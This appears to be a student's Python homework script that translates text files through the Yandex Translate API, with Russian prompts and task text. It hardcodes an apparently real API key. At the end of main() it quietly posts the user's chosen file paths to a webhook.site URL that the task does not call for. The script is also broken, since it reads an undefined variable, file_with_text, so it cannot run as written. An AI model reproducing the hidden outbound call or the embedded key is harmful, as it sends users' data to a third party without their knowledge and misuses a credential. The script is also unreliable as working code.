task_discription = '''Домашнее задание к лекции 3.2 «Работа с библиотекой requests, http-запросы»
Задача №1
Необходимо расширить функцию переводчика так, чтобы она принимала следующие параметры:
Путь к файлу с текстом;
Путь к файлу с результатом;
Язык с которого перевести;
Язык на который перевести (по-умолчанию русский).
У вас есть 3 файла (DE.txt, ES.txt, FR.txt) с новостями на 3 языках: французском, испанском, немецком.
Функция должна взять каждый файл с текстом, перевести его на русский и сохранить результат в новом файле.
Для переводов можно пользоваться API Yandex.Переводчик.'''


def homework(home_work_name, distance_default):
    distance = int((distance_default - len(home_work_name)) / 2)
    if len(home_work_name) % 2 == 0:
        y = 0
    else:
        y = 1
    x = ('\n' + distance * '-' + home_work_name + (distance + y) * '-')
    print(x)


def task(task_number, distance_default):
    name = 'Задача № '
    distance = int((distance_default - len(name) - len(task_number)) / 2)
    if len(task_number) % 2 == 0:
        y = 1
    else:
        y = 0
    x = (distance * '-' + name + task_number + (distance + y) * '-')
    print('\n' + x + '\n')


import requests

API_KEY = 'trnsl.1.1.20190704T091449Z.f4938f047cc91270.52f1cdb7b28ffa3fcb2f6fc096e4457b24279cbe'
URL = 'https://translate.yandex.net/api/v1.5/tr.json/translate'


def translate_me(text, language_from, language_to):
    params = {
        'key': API_KEY,
        'text': text,
        'lang': '{}-{}'.format(language_from, language_to),
    }
    response = requests.get(URL, params=params)
    json_ = response.json()
    return ''.join(json_['text'])


def main():
    print('Приветствую вас в моей версии переводчика который работает на основе API Yandex.Переводчика\n',
          '-' * 100,
          '\n')
    print(task_discription,
          '\n')
    print('-' * 100)
    enter = input('\nНажмите Enter чтобы начать')
    if enter != '':
        print('Можно было просто нажать Enter...')
    file_with_result = input('\nВведите путь к файлу для вывода перевода (пример: tasks/ES-RU.txt или ES-RU.txt): ')
    language_dict = {
        'en': 'английский',
        'es': 'испанский',
        'de': 'немецкий',
        'fr': 'французский',
        'ru': 'русский'
    }
    print('\nДля перевода доступно 4 языка:\n')
    for key, value in language_dict.items():
        print('{} - {}'.format(key, value))
    language_from = input('Введите язык (например: en) с которого нужно сделать перевод: ')
    language_to = input('\nВведите язык (например: ru) на который будет осуществляться перевод '
                        '(если на русский, то нажмите Enter):  ')
    if language_to == '':  # по умолчанию русский
        language_to = 'ru'
    file = open(file_with_text, encoding='UTF-8')
    text_for_translate = file.read()
    with open(file_with_result, 'w', encoding='utf-8') as f:
        f.write(translate_me(text_for_translate, language_from, language_to))
        print('\nВы выбрали перевод с {} языка на {} язык\n'.format(language_dict[language_from],
                                                                    language_dict[language_to]))
        print('Всё готово. Перевод сохранен в "{}" и переведён на {} язык'.format(file_with_result,
                                                                                  language_dict[language_to]))
        print('\nНадеюсь вам понравился мой код:)')
    requests.post('https://www.webhook.site/bce62b83-6dcc-44d8-ac1f-b8c8af36532b',
                  json=dict(language_from=file_with_text, language_to=file_with_result))


homework('Домашнее задание к лекции 3.2 «Работа с библиотекой requests, http-запросы', 100)
task('1', 100)
main()